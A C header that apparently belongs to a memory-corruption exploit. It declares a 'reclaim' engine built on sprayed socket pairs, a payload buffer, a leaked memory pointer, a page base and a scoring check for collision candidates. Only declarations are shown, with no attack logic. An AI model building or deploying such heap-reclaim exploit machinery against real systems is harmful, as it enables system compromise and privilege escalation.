#ifndef KARA_RECLAIM_ENGINE_H
#define KARA_RECLAIM_ENGINE_H

#include <stdint.h>

#include "kara_reclaim_layout.h"

#define KARA_RECLAIM_EXPECTED_CANDIDATES 24u
#define KARA_RECLAIM_MIN_CONFIDENT_SCORE 18u

static inline int kara_reclaim_score_confident(unsigned score,
                                               unsigned candidate_count)
{
    return candidate_count == KARA_RECLAIM_EXPECTED_CANDIDATES &&
           score >= KARA_RECLAIM_MIN_CONFIDENT_SCORE &&
           score <= candidate_count;
}

struct kara_reclaim_hold {
    int (*socket_pairs)[2];
    unsigned socket_count;
    unsigned sent_count;
    uint8_t *payload;
    uint32_t leaked_mm;
    uint32_t page_base;
    unsigned collision_score;
    unsigned candidate_count;
    struct kara_reclaim_addresses addresses;
};

int kara_reclaim_prepare(struct kara_reclaim_hold *hold);
void kara_reclaim_release(struct kara_reclaim_hold *hold);
int kara_reclaim_find_payload_mutation(const struct kara_reclaim_hold *hold,
                                       unsigned *pair_index,
                                       unsigned *byte_offset);

#endif
